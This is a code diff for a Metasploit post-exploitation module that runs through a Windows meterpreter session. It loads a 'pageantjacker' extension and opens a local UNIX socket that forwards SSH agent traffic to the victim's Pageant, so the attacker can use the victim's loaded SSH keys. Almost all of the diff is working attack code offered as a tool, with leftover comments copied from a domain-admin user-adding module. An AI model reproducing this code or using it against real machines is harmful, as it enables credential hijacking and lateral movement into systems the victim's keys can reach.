@@ -5,6 +5,7 @@
 
 require 'msf/core'
 require 'rex'
+require 'tmpdir'
 
 class Metasploit3 < Msf::Post
 
@@ -21,16 +22,52 @@ class Metasploit3 < Msf::Post
         'Platform'      => [ 'win' ],
         'SessionTypes'  => [ 'meterpreter' ]
       ))
-    register_options(
-      [
-        OptString.new('USERNAME',  [true,  'Username to add to the Domain or Domain Group', '']),
-        OptString.new('PASSWORD',  [false, 'Password of the user (only required to add a user to the domain)', '']),
-        OptString.new('GROUP',     [true,  'Domain Group to add the user into.', 'Domain Admins']),
-        OptBool.new('ADDTOGROUP',  [true,  'Add user into Domain Group', false]),
-        OptBool.new('ADDTODOMAIN', [true,  'Add user to the Domain', true]),
-        OptString.new('TOKEN',     [false, 'Username or PID of the Token which will be used. If blank, Domain Admin Tokens will be enumerated. (Username doesnt require a Domain)', '']),
-        OptBool.new('GETSYSTEM',   [true,  'Attempt to get SYSTEM privilege on the target host.', true])
-      ], self.class)
+    #register_options(
+    #  [
+    #  ], self.class)
+  end
+
+  def run
+
+    ## load incognito
+    if(!session.pageantjacker)
+      session.core.use("pageantjacker")
+    end
+
+    if(!session.pageantjacker)
+      print_status("Failed to load pageantjacker on #{session.sid} (#{session.session_host})")
+      return false
+    end
+
+    sockpath = "#{::Dir::Tmpname.tmpdir}/#{::Dir::Tmpname.make_tmpname('pageantjacker', 5)}"
+    if ::File.exists?(sockpath)
+        print_line("Your requested socket (#{sockpath}) already exists. Remove it or choose another path and try again.")
+        return false
+    end 
+
+    ::UNIXServer.open(sockpath) {|serv|
+      print_status("Launched listening socket on #{sockpath}.")
+      print_status("Set your SSH_AUTH_SOCK variable to #{sockpath} (export SSH_AUTH_SOCK=\"#{sockpath}\"")
+      print_status("Now use any tool normally (e.g. ssh-add)")
+    
+      loop { 
+        s = serv.accept
+        loop {
+          socket_request_data = s.recvfrom(8192)
+          break if socket_request_data.nil? || socket_request_data.first.nil? || socket_request_data.first.empty?
+          response_data = client.pageantjacker.forward_to_pageant(socket_request_data.first, socket_request_data.first.size)
+          s.send response_data,0 if !response_data.nil?
+        }   
+      }   
+    }   
+
+    if ::File.exists?(sockpath)
+        print_line("Cleaning up; removing #{sockpath}")
+        ::File.delete(sockpath)
+    else
+        print_line("Unable to remove socket #{sockpath}")
+    end
+
   end
 
 #  def get_system
